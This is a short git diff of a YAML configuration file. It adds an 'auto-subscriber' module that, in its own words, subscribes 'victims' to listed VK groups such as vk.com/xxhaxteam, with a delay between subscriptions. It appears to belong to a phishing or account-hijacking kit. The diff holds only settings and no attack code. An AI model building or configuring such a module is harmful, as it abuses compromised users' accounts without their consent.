@@ -28,3 +28,12 @@ plugins: # List of plugins & their settings
     lang: en # Or ru, if you prefer russian
     successOnly: true # Set `false`, if you want receive unsuccessful messages
     enabled: false # Set `true` to enable
+
+  auto-subscriber: # Module for automatically subscribe victims to some groups
+    groups: # List of groups
+      - 1 # Group can be number (id)
+      - vk.com/xxhaxteam # or link
+      - team # or screen name
+      - "@dont_panic_42" # or @mention, but in ""
+    timeout: 1000 # Timeout between subscriptions in milliseconds. 1000ms = 1s
+    enabled: false
